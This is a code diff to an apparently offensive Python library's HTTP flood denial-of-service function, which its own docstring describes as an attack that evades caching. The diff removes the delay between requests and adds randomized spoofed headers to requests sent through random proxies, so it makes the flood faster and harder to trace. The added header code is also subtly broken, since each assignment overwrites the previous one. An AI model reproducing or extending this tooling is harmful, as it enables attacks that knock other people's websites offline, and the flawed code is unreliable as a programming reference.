@@ -367,7 +367,7 @@ class htflood(threading.Thread):
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def http_flood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,timeout=5,round_min=5,round_max=15,interval=0.1,duration=300,logs=True,returning=False,set_tor=False):
+def http_flood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,timeout=5,round_min=5,round_max=15,interval=0,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -1903,6 +1903,16 @@ class phu(threading.Thread):
     pr=random.choice(httplist)
     proxy = urllib2.ProxyHandler({ 'http': pr, 'https': pr })
     opener = urllib2.build_opener(proxy) 
+    opener.addheaders = [('User-agent', random.choice(ua))]
+    opener.addheaders = [('Cache-Control', 'no-cache')]
+    opener.addheaders = [('Accept',random.choice(a))]
+    opener.addheaders = [('Accept-Language',random.choice(al))]
+    opener.addheaders = [('Accept-Encoding',random.choice(ec))]
+    opener.addheaders = [('Accept-Charset', random.choice(ac))]
+    opener.addheaders = [('Referer', random.choice(referers) +p)]
+    opener.addheaders = [('Keep-Alive', random.randint(100,500))]
+    opener.addheaders = [('Connection', 'keep-alive')]
+    opener.addheaders = [('Host',self.target)]
     urllib2.install_opener(opener)
     urllib2.urlopen("http://"+self.target+u,timeout=self.timeout)
     if stop==True:
